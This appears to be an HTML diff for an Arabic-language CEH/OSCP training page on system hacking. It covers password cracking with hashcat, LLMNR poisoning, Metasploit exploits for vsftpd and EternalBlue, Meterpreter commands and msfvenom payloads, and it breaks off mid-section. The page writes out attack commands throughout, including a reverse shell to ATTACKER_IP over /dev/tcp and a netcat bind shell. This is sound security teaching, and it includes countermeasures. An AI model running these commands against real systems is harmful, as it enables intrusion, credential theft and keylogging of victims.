@@ -1,0 +1,903 @@
+
+<!-- =======================================================
+     CEH MODULE 6: SYSTEM HACKING (PART 1)
+     ======================================================= -->
+<div class="meth-content-view" id="meth-content-sys-hack" style="display:none;" dir="rtl">
+
+  <div class="cyber-hero">
+    <h2 class="hero-title"><span class="hero-icon">💻</span> Module 6: System Hacking — الاختراق الفعلي</h2>
+    <p class="hero-tagline">جمعنا المعلومات ✓ فحصنا البورتات ✓ وجدنا الثغرات ✓ — الآن حان وقت الدخول! 💀</p>
+    <div class="hero-meta">
+      <span class="meta-pill"><span class="pill-dot" style="background:#ff5555;"></span> Module 06</span>
+      <span class="meta-pill"><span class="pill-dot" style="background:#ff9900;"></span> Exploitation</span>
+      <span class="meta-pill"><span class="pill-dot" style="background:#bd93f9;"></span> OSCP Core</span>
+    </div>
+  </div>
+
+  <!-- AUTHENTICATION -->
+  <div class="cyber-card" style="border-top:3px solid #00bfff;">
+    <div class="card-header">
+      <h3 style="margin:0; color:#00bfff;">🔐 أولاً: Authentication — كيف تحمي الأنظمة نفسها؟</h3>
+    </div>
+    <p style="color:#aaa; line-height:1.9;">
+      الـ Authentication هو عملية <strong>التحقق من هوية المستخدم</strong> قبل السماح له بالدخول.
+      معرفة طرق الـ Authentication هي مفتاح فهم كيفية كسرها!
+    </p>
+    <div style="display:grid; grid-template-columns:repeat(auto-fit,minmax(180px,1fr)); gap:10px; margin-top:15px;">
+      <div style="background:rgba(0,191,255,0.08); border:1px solid rgba(0,191,255,0.3); border-radius:8px; padding:12px; text-align:center;">
+        <div style="font-size:2em;">🔑</div>
+        <strong style="color:#00bfff;">Password</strong>
+        <p style="color:#aaa; font-size:0.8em; margin:4px 0 0;">الأكثر شيوعاً والأسهل كسراً</p>
+      </div>
+      <div style="background:rgba(0,191,255,0.08); border:1px solid rgba(0,191,255,0.3); border-radius:8px; padding:12px; text-align:center;">
+        <div style="font-size:2em;">📱</div>
+        <strong style="color:#00bfff;">Token / OTP</strong>
+        <p style="color:#aaa; font-size:0.8em; margin:4px 0 0;">كود مؤقت يُرسل للموبايل</p>
+      </div>
+      <div style="background:rgba(0,191,255,0.08); border:1px solid rgba(0,191,255,0.3); border-radius:8px; padding:12px; text-align:center;">
+        <div style="font-size:2em;">👆</div>
+        <strong style="color:#00bfff;">Biometric</strong>
+        <p style="color:#aaa; font-size:0.8em; margin:4px 0 0;">بصمة إصبع، وجه، عين</p>
+      </div>
+      <div style="background:rgba(0,191,255,0.08); border:1px solid rgba(0,191,255,0.3); border-radius:8px; padding:12px; text-align:center;">
+        <div style="font-size:2em;">🗝️</div>
+        <strong style="color:#00bfff;">Public Key</strong>
+        <p style="color:#aaa; font-size:0.8em; margin:4px 0 0;">SSH Keys، أقوى طريقة</p>
+      </div>
+    </div>
+  </div>
+
+  <!-- PASSWORD & HASHING -->
+  <div class="cyber-card" style="border-top:3px solid #f1fa8c;">
+    <div class="card-header">
+      <h3 style="margin:0; color:#f1fa8c;">🔑 ثانياً: Password Hashing — كيف تُخزَّن الباسوردات؟</h3>
+    </div>
+
+    <div style="display:grid; grid-template-columns:1fr 1fr; gap:15px; margin-top:18px;">
+      <div>
+        <h5 style="color:#fff;">🧠 ما هو الـ Hash؟</h5>
+        <p style="color:#aaa; font-size:0.9em; line-height:1.8;">
+          الـ Hash هو <strong>تحويل الباسورد لنص مشفر</strong> بطريقة أحادية الاتجاه — يمكن تحويل الباسورد للـ Hash لكن لا يمكن العكس مباشرة.
+        </p>
+        <div style="background:rgba(0,0,0,0.4); border:1px solid #44475a; border-radius:8px; padding:12px; margin-top:10px; direction:ltr; text-align:left; font-family:monospace; font-size:0.85em;">
+          <span style="color:#50fa7b;">password</span><br>
+          <span style="color:#6272a4;">&darr; MD5</span><br>
+          <span style="color:#ff9900;">5f4dcc3b5aa765d61d8327deb882cf99</span>
+        </div>
+      </div>
+      <div>
+        <h5 style="color:#fff;">🧂 ما هو الـ Salt؟</h5>
+        <p style="color:#aaa; font-size:0.9em; line-height:1.8;">
+          الـ Salt هو <strong>قيمة عشوائية تُضاف للباسورد قبل التشفير</strong> — يمنع هجمات الـ Rainbow Tables لأن نفس الباسورد يُنتج هاشات مختلفة.
+        </p>
+        <div style="background:rgba(0,0,0,0.4); border:1px solid #44475a; border-radius:8px; padding:12px; margin-top:10px; direction:ltr; text-align:left; font-family:monospace; font-size:0.85em;">
+          <span style="color:#50fa7b;">password</span> + <span style="color:#bd93f9;">xK9#mZ</span><br>
+          <span style="color:#6272a4;">&darr; bcrypt</span><br>
+          <span style="color:#ff9900;">$2y$10$xK9mZ...unique_hash</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- Hash Types -->
+    <h5 style="color:#f1fa8c; margin-top:20px;">📊 أنواع الـ Hash الشائعة:</h5>
+    <table class="interactive-table" dir="rtl" style="margin-top:10px; font-size:0.9em;">
+      <thead><tr><th>النوع</th><th>الطول</th><th>مستوى الأمان</th><th>الاستخدام</th></tr></thead>
+      <tbody>
+        <tr><td><code>MD5</code></td><td>32 حرف</td><td style="color:#ff5555;">⚠️ ضعيف جداً</td><td>قديم، لا يُنصح به</td></tr>
+        <tr><td><code>SHA-1</code></td><td>40 حرف</td><td style="color:#ff9900;">⚠️ ضعيف</td><td>قديم، Git commits</td></tr>
+        <tr><td><code>SHA-256</code></td><td>64 حرف</td><td style="color:#50fa7b;">✅ جيد</td><td>SSL, Blockchain</td></tr>
+        <tr><td><code>bcrypt</code></td><td>60 حرف</td><td style="color:#50fa7b;">✅ ممتاز</td><td>تخزين باسوردات المواقع</td></tr>
+        <tr><td><code>NTLM</code></td><td>32 حرف</td><td style="color:#ff9900;">⚠️ متوسط</td><td>Windows Authentication</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <!-- WINDOWS AUTH -->
+  <div class="cyber-card" style="border-top:3px solid #bd93f9;">
+    <div class="card-header">
+      <h3 style="margin:0; color:#bd93f9;">🪟 ثالثاً: Windows Authentication Protocols</h3>
+    </div>
+    <div style="display:grid; grid-template-columns:1fr 1fr; gap:15px; margin-top:18px;">
+      <div style="background:rgba(189,147,249,0.08); border:1px solid rgba(189,147,249,0.4); border-radius:10px; padding:18px;">
+        <h5 style="color:#bd93f9; margin-top:0;">NTLM — النظام القديم</h5>
+        <p style="color:#aaa; font-size:0.9em; line-height:1.8;">يعمل بالـ Hash بدلاً من الباسورد الحقيقي. الجهاز بيبعت الـ Hash ويتحقق منه بدون إرسال الباسورد نفسه.</p>
+        <div style="background:rgba(255,85,85,0.1); border-radius:6px; padding:10px; margin-top:10px; font-size:0.85em;">
+          <strong style="color:#ff5555;">🎯 نقطة ضعف:</strong>
+          <p style="color:#aaa; margin:4px 0 0;">يمكن سرقة الـ Hash واستخدامه مباشرة دون كسره!<br>→ <strong>Pass-the-Hash Attack 🔥</strong></p>
+        </div>
+      </div>
+      <div style="background:rgba(80,250,123,0.08); border:1px solid rgba(80,250,123,0.4); border-radius:10px; padding:18px;">
+        <h5 style="color:#50fa7b; margin-top:0;">Kerberos — النظام الحديث</h5>
+        <p style="color:#aaa; font-size:0.9em; line-height:1.8;">يعمل بنظام التذاكر (Tickets). المستخدم يحصل على TGT (Ticket Granting Ticket) ثم يستخدمه للوصول للخدمات.</p>
+        <div style="background:rgba(80,250,123,0.1); border-radius:6px; padding:10px; margin-top:10px; font-size:0.85em;">
+          <strong style="color:#50fa7b;">🎯 نقطة ضعف:</strong>
+          <p style="color:#aaa; margin:4px 0 0;">يمكن سرقة التذاكر من الذاكرة<br>→ <strong>Pass-the-Ticket / Kerberoasting</strong></p>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- PASSWORD CRACKING -->
+  <div class="cyber-card" style="border-top:3px solid #ff5555;">
+    <div class="card-header">
+      <h3 style="margin:0; color:#ff5555;">🔓 رابعاً: Password Cracking — كسر الباسوردات</h3>
+    </div>
+
+    <!-- Attack types -->
+    <div style="display:grid; grid-template-columns:repeat(auto-fit,minmax(200px,1fr)); gap:10px; margin-top:15px;">
+      <div style="background:rgba(255,85,85,0.08); border:1px solid rgba(255,85,85,0.3); border-radius:8px; padding:14px;">
+        <h6 style="color:#ff5555; margin-top:0;">📖 Dictionary Attack</h6>
+        <p style="color:#aaa; font-size:0.85em;">يجرب كلمات من قاموس (rockyou.txt). الأسرع ويغطي الباسوردات الشائعة.</p>
+      </div>
+      <div style="background:rgba(255,85,85,0.08); border:1px solid rgba(255,85,85,0.3); border-radius:8px; padding:14px;">
+        <h6 style="color:#ff5555; margin-top:0;">💪 Brute Force</h6>
+        <p style="color:#aaa; font-size:0.85em;">يجرب كل التركيبات الممكنة. بطيء جداً لكن لا يفوته شيء.</p>
+      </div>
+      <div style="background:rgba(255,85,85,0.08); border:1px solid rgba(255,85,85,0.3); border-radius:8px; padding:14px;">
+        <h6 style="color:#ff5555; margin-top:0;">🔀 Hybrid Attack</h6>
+        <p style="color:#aaa; font-size:0.85em;">يجمع القاموس + تعديلات (مثال: password1, P@ssword!).</p>
+      </div>
+      <div style="background:rgba(255,85,85,0.08); border:1px solid rgba(255,85,85,0.3); border-radius:8px; padding:14px;">
+        <h6 style="color:#ff5555; margin-top:0;">🌈 Rainbow Table</h6>
+        <p style="color:#aaa; font-size:0.85em;">جداول جاهزة بالـ Hashes — سريع جداً لكن لا يعمل مع الـ Salt.</p>
+      </div>
+    </div>
+
+    <!-- Hashcat -->
+    <div style="margin-top:20px; border:1px solid rgba(255,153,0,0.4); border-radius:8px; overflow:hidden;">
+      <div style="background:rgba(255,153,0,0.1); padding:10px 15px; display:flex; justify-content:space-between; align-items:center;">
+        <strong style="color:#ff9900; font-size:1.05em;">⚡ Hashcat — أقوى أداة كسر هاش في العالم</strong>
+        <span style="background:rgba(255,153,0,0.2); color:#ff9900; font-size:0.75em; padding:3px 10px; border-radius:20px;">GPU Powered 🔥</span>
+      </div>
+      <div style="padding:15px;">
+        <div class="cmd-ui-box" style="font-size:0.85em;">hash-identifier <span style="color:#6272a4;"># خطوة 1: حدد نوع الهاش أولاً</span></div>
+        <div class="cmd-ui-box" style="font-size:0.85em; margin-top:8px;">hashcat -m 0 hash.txt rockyou.txt <span style="color:#6272a4;"># -m 0 = MD5</span></div>
+        <div class="cmd-ui-box" style="font-size:0.85em; margin-top:8px;">hashcat -m 1000 hash.txt rockyou.txt <span style="color:#6272a4;"># -m 1000 = NTLM</span></div>
+        <div class="cmd-ui-box" style="font-size:0.85em; margin-top:8px;">hashcat -m 1800 hash.txt rockyou.txt <span style="color:#6272a4;"># -m 1800 = SHA-512 (Linux)</span></div>
+        <div class="cmd-ui-box" style="font-size:0.85em; margin-top:8px;">hashcat --help | grep -i "hash modes" <span style="color:#6272a4;"># شوف كل الـ modes</span></div>
+        <div style="background:rgba(0,0,0,0.3); border-radius:6px; padding:10px; margin-top:12px; font-size:0.85em;">
+          <strong style="color:#f1fa8c;">📌 للحصول على Wordlist rockyou.txt في Kali:</strong><br>
+          <code style="color:#50fa7b;">gzip -d /usr/share/wordlists/rockyou.txt.gz</code>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- LLMNR POISONING -->
+  <div class="cyber-card" style="border-top:3px solid #ff5555; background:rgba(255,85,85,0.03);">
+    <div class="card-header">
+      <h3 style="margin:0; color:#ff5555;">☠️ خامساً: LLMNR Poisoning — أخطر هجوم على الشبكة الداخلية</h3>
+    </div>
+    <div style="display:grid; grid-template-columns:1fr 1fr; gap:15px; margin-top:18px;">
+      <div>
+        <h5 style="color:#fff;">🧠 كيف يعمل الهجوم؟</h5>
+        <ol style="color:#aaa; font-size:0.9em; line-height:2;">
+          <li>جهاز في الشبكة يطلب اسم سيرفر <code style="color:#f1fa8c;">\\FILESERVER</code></li>
+          <li>الـ DNS مش عارف الجواب</li>
+          <li>الجهاز يسأل الشبكة كلها: <em>"مين يعرف FILESERVER؟"</em></li>
+          <li>أنت (المهاجم) ترد: <strong style="color:#ff5555;">"أنا FILESERVER!" 😈</strong></li>
+          <li>الجهاز الضحية يبعتلك الـ <strong>NTLM Hash</strong> تلقائياً!</li>
+        </ol>
+      </div>
+      <div>
+        <h5 style="color:#ff5555;">⚡ Responder — أداة الهجوم</h5>
+        <div class="cmd-ui-box" style="font-size:0.85em;">responder -I eth0</div>
+        <div class="cmd-ui-box" style="font-size:0.85em; margin-top:8px;">responder -I eth0 -rdwv <span style="color:#6272a4;"># كل الـ protocols</span></div>
+        <p style="color:#aaa; font-size:0.9em; margin-top:12px;">بعد التقاط الـ Hash:</p>
+        <div class="cmd-ui-box" style="font-size:0.85em;">hashcat -m 5600 captured_hash.txt rockyou.txt</div>
+        <p style="color:#6272a4; font-size:0.8em; margin-top:4px;"><code>-m 5600</code> = NTLMv2</p>
+        <div style="background:rgba(255,85,85,0.1); border-radius:6px; padding:8px; margin-top:10px; font-size:0.85em; color:#ff5555;">
+          🎯 يعمل على أي شبكة Windows داخلية — بدون باسورد أو صلاحيات!
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- SHELLS -->
+  <div class="cyber-card" style="border-top:3px solid #50fa7b;">
+    <div class="card-header">
+      <h3 style="margin:0; color:#50fa7b;">💻 سادساً: Shells — بوابة التحكم في الجهاز</h3>
+    </div>
+    <p style="color:#aaa; margin-top:10px;">بعد استغلال الثغرة، ستحصل على <strong>Shell</strong> — وهو سطر أوامر مباشر على الجهاز المخترق.</p>
+
+    <div style="display:grid; grid-template-columns:1fr 1fr; gap:15px; margin-top:18px;">
+      <!-- Reverse Shell -->
+      <div style="background:rgba(80,250,123,0.08); border:2px solid rgba(80,250,123,0.5); border-radius:10px; padding:18px;">
+        <div style="display:flex; justify-content:space-between; align-items:center;">
+          <h5 style="color:#50fa7b; margin:0;">🔄 Reverse Shell</h5>
+          <span style="background:rgba(80,250,123,0.2); color:#50fa7b; font-size:0.75em; padding:3px 10px; border-radius:20px;">⭐ الأهم</span>
+        </div>
+        <p style="color:#aaa; font-size:0.9em; margin-top:10px;">الضحية <strong>يتصل بجهازك</strong> أنت — يتخطى الـ Firewall!</p>
+        <div style="margin-top:12px;">
+          <p style="color:#6272a4; font-size:0.8em; margin-bottom:4px;">على جهازك (Attacker) — استمع:</p>
+          <div class="cmd-ui-box" style="font-size:0.8em;">nc -lvnp 4444</div>
+          <p style="color:#6272a4; font-size:0.8em; margin-bottom:4px; margin-top:8px;">على جهاز الضحية — ابعت الـ Shell:</p>
+          <div class="cmd-ui-box" style="font-size:0.8em;">bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/4444 0&gt;&amp;1</div>
+        </div>
+      </div>
+      <!-- Bind Shell -->
+      <div style="background:rgba(255,85,85,0.06); border:1px solid rgba(255,85,85,0.3); border-radius:10px; padding:18px;">
+        <div style="display:flex; justify-content:space-between; align-items:center;">
+          <h5 style="color:#ff5555; margin:0;">🔗 Bind Shell</h5>
+          <span style="background:rgba(255,85,85,0.2); color:#ff5555; font-size:0.75em; padding:3px 10px; border-radius:20px;">محدود</span>
+        </div>
+        <p style="color:#aaa; font-size:0.9em; margin-top:10px;">أنت <strong>تتصل بالضحية</strong> — لكن الـ Firewall غالباً يبلوكه.</p>
+        <div style="margin-top:12px;">
+          <p style="color:#6272a4; font-size:0.8em; margin-bottom:4px;">على جهاز الضحية — افتح بورت:</p>
+          <div class="cmd-ui-box" style="font-size:0.8em;">nc -lvnp 4444 -e /bin/bash</div>
+          <p style="color:#6272a4; font-size:0.8em; margin-bottom:4px; margin-top:8px;">على جهازك — اتصل:</p>
+          <div class="cmd-ui-box" style="font-size:0.8em;">nc -nv VICTIM_IP 4444</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- RevShell tip -->
+    <div style="background:rgba(0,0,0,0.3); border-left:3px solid #50fa7b; padding:12px; border-radius:4px; margin-top:15px; font-size:0.9em;">
+      💡 <strong>موقع ممتاز لتوليد Reverse Shells جاهزة:</strong>
+      <code style="color:#50fa7b; margin-right:10px;">revshells.com</code> — يدعم Python, PHP, PowerShell, Java, وأكثر!
+    </div>
+  </div>
+
+  <!-- METASPLOIT -->
+  <div class="cyber-card" style="border-top:3px solid #ff9900;">
+    <div class="card-header">
+      <h3 style="margin:0; color:#ff9900;">💣 سابعاً: Metasploit — صاروخ الاختراق</h3>
+    </div>
+    <p style="color:#aaa; margin-top:10px;">Metasploit هو إطار عمل كامل للاختراق يحتوي على آلاف الـ Exploits الجاهزة.</p>
+
+    <!-- vsftpd Example -->
+    <div style="margin-top:18px; border:1px solid rgba(255,153,0,0.4); border-radius:8px; overflow:hidden;">
+      <div style="background:rgba(255,153,0,0.1); padding:10px 15px;">
+        <strong style="color:#ff9900;">🔥 مثال 1: استغلال vsftpd 2.3.4 Backdoor</strong>
+      </div>
+      <div style="padding:15px;">
+        <div style="display:grid; grid-template-columns:auto 1fr; gap:8px 15px; align-items:center; font-size:0.85em;">
+          <span style="color:#6272a4; white-space:nowrap;">1. تشغيل Metasploit:</span>
+          <div class="cmd-ui-box">msfconsole</div>
+          <span style="color:#6272a4; white-space:nowrap;">2. اختيار الـ Exploit:</span>
+          <div class="cmd-ui-box">use exploit/unix/ftp/vsftpd_234_backdoor</div>
+          <span style="color:#6272a4; white-space:nowrap;">3. تحديد الهدف:</span>
+          <div class="cmd-ui-box">set RHOSTS 192.168.1.5</div>
+          <span style="color:#6272a4; white-space:nowrap;">4. الهجوم:</span>
+          <div class="cmd-ui-box">run</div>
+          <span style="color:#50fa7b; white-space:nowrap; font-weight:bold;">✅ النتيجة:</span>
+          <div style="background:rgba(0,0,0,0.4); border:1px solid #50fa7b; border-radius:4px; padding:8px; font-family:monospace; direction:ltr; text-align:left; color:#50fa7b;">
+            [*] Command shell session 1 opened! 🔥
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- EternalBlue Example -->
+    <div style="margin-top:15px; border:1px solid rgba(255,85,85,0.4); border-radius:8px; overflow:hidden;">
+      <div style="background:rgba(255,85,85,0.1); padding:10px 15px; display:flex; justify-content:space-between;">
+        <strong style="color:#ff5555;">💀 مثال 2: EternalBlue — ثغرة WannaCry الشهيرة</strong>
+        <span style="font-size:0.8em; color:#aaa;">CVE-2017-0144</span>
+      </div>
+      <div style="padding:15px;">
+        <p style="color:#aaa; font-size:0.85em; margin-top:0;">ثغرة في SMB على Windows — استخدمتها NSA ثم سُرقت وأُستخدمت في هجوم WannaCry 2017!</p>
+        <div class="cmd-ui-box" style="font-size:0.85em;">use exploit/windows/smb/ms17_010_eternalblue</div>
+        <div class="cmd-ui-box" style="font-size:0.85em; margin-top:8px;">set RHOSTS 192.168.1.5</div>
+        <div class="cmd-ui-box" style="font-size:0.85em; margin-top:8px;">set PAYLOAD windows/x64/meterpreter/reverse_tcp</div>
+        <div class="cmd-ui-box" style="font-size:0.85em; margin-top:8px;">set LHOST YOUR_IP</div>
+        <div class="cmd-ui-box" style="font-size:0.85em; margin-top:8px;">run</div>
+      </div>
+    </div>
+
+    <!-- Meterpreter Commands -->
+    <div style="margin-top:15px;">
+      <h5 style="color:#f1fa8c;">🎮 بعد الدخول — أهم أوامر Meterpreter:</h5>
+      <div style="display:grid; grid-template-columns:1fr 1fr; gap:8px; margin-top:10px; font-size:0.85em;">
+        <div class="cmd-ui-box">sysinfo <span style="color:#6272a4;"># معلومات الجهاز</span></div>
+        <div class="cmd-ui-box">getuid <span style="color:#6272a4;"># المستخدم الحالي</span></div>
+        <div class="cmd-ui-box">getsystem <span style="color:#6272a4;"># ارفع الصلاحيات!</span></div>
+        <div class="cmd-ui-box">hashdump <span style="color:#6272a4;"># اسحب كل الهاشات</span></div>
+        <div class="cmd-ui-box">shell <span style="color:#6272a4;"># shell حقيقي</span></div>
+        <div class="cmd-ui-box">screenshot <span style="color:#6272a4;"># صورة الشاشة</span></div>
+        <div class="cmd-ui-box">download /etc/passwd <span style="color:#6272a4;"># حمّل ملف</span></div>
+        <div class="cmd-ui-box">keyscan_start <span style="color:#6272a4;"># Keylogger!</span></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- COMPLETE WORKFLOW -->
+  <div class="cyber-card" style="background:rgba(255,85,85,0.05); border:2px solid rgba(255,85,85,0.4);">
+    <div class="card-header">
+      <h3 style="margin:0; color:#ff5555;">🏆 Workflow الاختراق الكامل — من الصفر للـ Shell</h3>
+    </div>
+
+    <div style="margin-top:20px;">
+      <!-- Steps -->
+      <div style="display:grid; grid-template-columns:auto 1fr; gap:12px 20px; align-items:start;">
+
+        <div style="background:#00bfff; color:#000; font-weight:bold; padding:6px 14px; border-radius:20px; text-align:center; font-size:0.9em; white-space:nowrap;">STEP 1</div>
+        <div>
+          <strong style="color:#00bfff;">Scan للخدمات:</strong>
+          <div class="cmd-ui-box" style="font-size:0.85em; margin-top:6px;">nmap -sS -sV -O 192.168.1.5</div>
+          <p style="color:#50fa7b; font-size:0.85em; margin:4px 0 0;">→ اكتشفنا: FTP 21 — vsftpd 2.3.4 ، SMB 445 — Windows 7</p>
+        </div>
+
+        <div style="background:#bd93f9; color:#000; font-weight:bold; padding:6px 14px; border-radius:20px; text-align:center; font-size:0.9em; white-space:nowrap;">STEP 2</div>
+        <div>
+          <strong style="color:#bd93f9;">بحث عن الـ Exploits:</strong>
+          <div class="cmd-ui-box" style="font-size:0.85em; margin-top:6px;">searchsploit vsftpd 2.3.4</div>
+          <p style="color:#50fa7b; font-size:0.85em; margin:4px 0 0;">→ وجدنا: Backdoor Command Execution!</p>
+        </div>
+
+        <div style="background:#ff9900; color:#000; font-weight:bold; padding:6px 14px; border-radius:20px; text-align:center; font-size:0.9em; white-space:nowrap;">STEP 3</div>
+        <div>
+          <strong style="color:#ff9900;">تشغيل Metasploit:</strong>
+          <div class="cmd-ui-box" style="font-size:0.85em; margin-top:6px;">msfconsole → use exploit/unix/ftp/vsftpd_234_backdoor → set RHOSTS 192.168.1.5 → run</div>
+        </div>
+
+        <div style="background:#ff5555; color:#fff; font-weight:bold; padding:6px 14px; border-radius:20px; text-align:center; font-size:0.9em; white-space:nowrap;">STEP 4</div>
+        <div>
+          <strong style="color:#ff5555;">Banner Grabbing للتأكيد:</strong>
+          <div class="cmd-ui-box" style="font-size:0.85em; margin-top:6px;">nc -nv 192.168.1.5 21</div>
+          <p style="color:#50fa7b; font-size:0.85em; margin:4px 0 0;">→ <code>220 vsftpd 2.3.4</code> ← تأكيد الإصدار</p>
+        </div>
+
+        <div style="background:#50fa7b; color:#000; font-weight:bold; padding:6px 14px; border-radius:20px; text-align:center; font-size:0.9em; white-space:nowrap;">🎉 WIN</div>
+        <div style="background:rgba(80,250,123,0.1); border:1px solid #50fa7b; border-radius:8px; padding:12px;">
+          <strong style="color:#50fa7b;">Shell مفتوح على الجهاز! 🔥</strong>
+          <div style="font-family:monospace; font-size:0.85em; color:#50fa7b; margin-top:6px; direction:ltr; text-align:left;">
+            [*] Command shell session 1 opened<br>
+            root@metasploitable:~#
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- COUNTERMEASURES -->
+  <div class="cyber-card" style="border-top:3px solid #00bfff;">
+    <div class="card-header">
+      <h3 style="margin:0; color:#00bfff;">🛡️ Countermeasures — كيف تحمي نفسك؟</h3>
+    </div>
+    <div style="display:grid; grid-template-columns:repeat(auto-fit,minmax(220px,1fr)); gap:10px; margin-top:15px; font-size:0.85em;">
+      <div style="background:rgba(0,191,255,0.08); border:1px solid rgba(0,191,255,0.3); border-radius:8px; padding:12px;">
+        <strong style="color:#00bfff;">🔑 Passwords قوية</strong>
+        <p style="color:#aaa; margin:4px 0 0;">12+ حرف، أرقام، رموز. لا تستخدم نفس الباسورد في أماكن متعددة.</p>
+      </div>
+      <div style="background:rgba(0,191,255,0.08); border:1px solid rgba(0,191,255,0.3); border-radius:8px; padding:12px;">
+        <strong style="color:#00bfff;">🚫 Disable LLMNR</strong>
+        <p style="color:#aaa; margin:4px 0 0;">من Group Policy → لا تدع الأجهزة تسأل الشبكة عن الأسماء.</p>
+      </div>
+      <div style="background:rgba(0,191,255,0.08); border:1px solid rgba(0,191,255,0.3); border-radius:8px; padding:12px;">
+        <strong style="color:#00bfff;">🔐 Kerberos لا NTLM</strong>
+        <p style="color:#aaa; margin:4px 0 0;">قلل استخدام NTLM وفعّل Kerberos في كل البيئة.</p>
+      </div>
+      <div style="background:rgba(0,191,255,0.08); border:1px solid rgba(0,191,255,0.3); border-radius:8px; padding:12px;">
+        <strong style="color:#00bfff;">📦 Patch دائماً</strong>
+        <p style="color:#aaa; margin:4px 0 0;">حدّث الأنظمة فوراً — EternalBlue كان له Patch قبل هجوم WannaCry!</p>
+      </div>
+    </div>
+  </div>
+
+  <!-- SUMMARY -->
+  <div class="cyber-card" style="background:rgba(0,0,0,0.4);">
+    <div class="card-header"><h3 style="margin:0; color:#fff;">💡 خلاصة Module 6</h3></div>
+    <table class="interactive-table" dir="rtl" style="margin-top:15px;">
+      <thead><tr><th>الجزء</th><th>الأداة</th><th>الهدف</th></tr></thead>
+      <tbody>
+        <tr><td>Hash Identification</td><td>hash-identifier</td><td>معرفة نوع الهاش</td></tr>
+        <tr><td>Password Cracking</td><td>Hashcat</td><td>تحويل Hash → Password</td></tr>
+        <tr><td>LLMNR Poisoning</td><td>Responder</td><td>التقاط NTLM Hashes من الشبكة</td></tr>
+        <tr><td>Shells</td><td>Netcat / msfvenom</td><td>التحكم في الجهاز</td></tr>
+        <tr><td>Exploitation</td><td>Metasploit</td><td>استغلال الثغرات أوتوماتيك</td></tr>
+        <tr><td>Post-Exploitation</td><td>Meterpreter</td><td>التحكم، رفع الصلاحيات، جمع البيانات</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <!-- =========================================================
+       PART 2: MANUAL EXPLOITATION, PAYLOADS, BUFFER OVERFLOW
+       ========================================================= -->
+
+  <div style="margin: 30px 0; border-top: 2px dashed rgba(255,0,68,0.4); padding-top: 25px;">
+    <div style="text-align:center; margin-bottom:25px;">
+      <div style="display:inline-block; background:rgba(255,0,68,0.15); border:2px solid #ff0044; border-radius:12px; padding:12px 30px;">
+        <h2 style="margin:0; color:#ff0044; font-size:1.3em;">💀 Module 6 — Part 2</h2>
+        <p style="margin:5px 0 0; color:#aaa; font-size:0.9em;">Manual Exploitation · msfvenom · Buffer Overflow</p>
+      </div>
+    </div>
+  </div>
+
+  <!-- MANUAL EXPLOITATION -->
+  <div class="cyber-card" style="border-top:3px solid #ff9900;">
+    <div class="card-header">
+      <h3 style="margin:0; color:#ff9900;">💣 1. Manual Exploitation — الاختراق اليدوي</h3>
+    </div>
+    <p style="color:#aaa; line-height:1.9; margin-top:12px;">
+      بدل الاعتماد الكامل على Metasploit، في الـ Manual Exploitation بتستغل الثغرة بنفسك بفهم أعمق.
+      <strong style="color:#f1fa8c;">ده المطلوب تحديداً في الـ OSCP!</strong>
+    </p>
+    <div style="display:grid; grid-template-columns:1fr 1fr; gap:15px; margin-top:15px;">
+      <div style="background:rgba(255,153,0,0.08); border:1px solid rgba(255,153,0,0.3); border-radius:8px; padding:14px;">
+        <h6 style="color:#ff9900; margin-top:0;">📤 مثال: File Upload → Shell</h6>
+        <ol style="color:#aaa; font-size:0.85em; line-height:2; margin:0;">
+          <li>موقع فيه upload بدون validation</li>
+          <li>ترفع <code>shell.php</code> بدل صورة</li>
+          <li>تفتح الملف من المتصفح</li>
+          <li>تحصل على Web Shell! 🔥</li>
+        </ol>
+      </div>
+      <div style="background:rgba(255,153,0,0.08); border:1px solid rgba(255,153,0,0.3); border-radius:8px; padding:14px;">
+        <h6 style="color:#ff9900; margin-top:0;">📡 مثال: Custom Request</h6>
+        <ol style="color:#aaa; font-size:0.85em; line-height:2; margin:0;">
+          <li>خدمة فيها bug معروف</li>
+          <li>بتبعت request مخصوص</li>
+          <li>البرنامج يتعطل ويفتحلك access</li>
+          <li>تنفذ shellcode! 🔥</li>
+        </ol>
+      </div>
+    </div>
+  </div>
+
+  <!-- MSFVENOM -->
+  <div class="cyber-card" style="border-top:3px solid #bd93f9;">
+    <div class="card-header">
+      <h3 style="margin:0; color:#bd93f9;">🦠 2. msfvenom — مصنع الـ Payloads</h3>
+    </div>
+    <p style="color:#aaa; margin-top:10px;">
+      <strong>msfvenom</strong> = أقوى أداة لإنشاء payloads خبيثة لكل الأنظمة وكل اللغات.
+    </p>
+
+    <!-- Payloads Grid -->
+    <div style="display:grid; grid-template-columns:repeat(auto-fit,minmax(300px,1fr)); gap:12px; margin-top:18px;">
+
+      <!-- Windows Reverse -->
+      <div style="border:1px solid rgba(255,85,85,0.4); border-radius:8px; overflow:hidden;">
+        <div style="background:rgba(255,85,85,0.1); padding:8px 14px; display:flex; justify-content:space-between;">
+          <strong style="color:#ff5555; font-size:0.9em;">🪟 Windows — Reverse Shell</strong>
+          <span style="font-size:0.75em; color:#aaa;">الأكثر استخداماً</span>
+        </div>
+        <div style="padding:12px;">
+          <div class="cmd-ui-box" style="font-size:0.78em;">msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f exe > reverse.exe</div>
+          <div style="display:grid; grid-template-columns:1fr 1fr; gap:5px; margin-top:8px; font-size:0.78em; color:#6272a4;">
+            <span><code>-p</code> نوع الـ payload</span>
+            <span><code>LHOST</code> IP جهازك</span>
+            <span><code>LPORT</code> البورت</span>
+            <span><code>-f exe</code> نوع الملف</span>
+          </div>
+        </div>
+      </div>
+
+      <!-- Windows Bind -->
+      <div style="border:1px solid rgba(255,153,0,0.3); border-radius:8px; overflow:hidden;">
+        <div style="background:rgba(255,153,0,0.08); padding:8px 14px;">
+          <strong style="color:#ff9900; font-size:0.9em;">🔗 Windows — Bind Shell</strong>
+        </div>
+        <div style="padding:12px;">
